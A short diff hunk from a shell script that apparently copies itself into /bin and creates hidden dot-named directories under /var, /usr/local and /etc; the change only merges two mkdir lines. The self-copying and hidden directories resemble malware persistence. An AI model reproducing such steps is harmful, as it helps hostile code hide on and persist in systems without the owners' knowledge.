@@ -22,8 +22,8 @@ if [ ! -e /bin/pass ]; then
     cp "$0" /bin
 fi
 if [ ! -e /etc/.raulm ] && [ ! -e /var/.Hj ] && [ ! -e /usr/local/.ko ]; then
-    mkdir /var/.Hj /usr/local/.ko /etc/.raulm 
-    mkdir /etc/.raulm/.Ye
+    
+    mkdir /var/.Hj /usr/local/.ko /etc/.raulm /etc/.raulm/.Ye
 fi
     
 #######
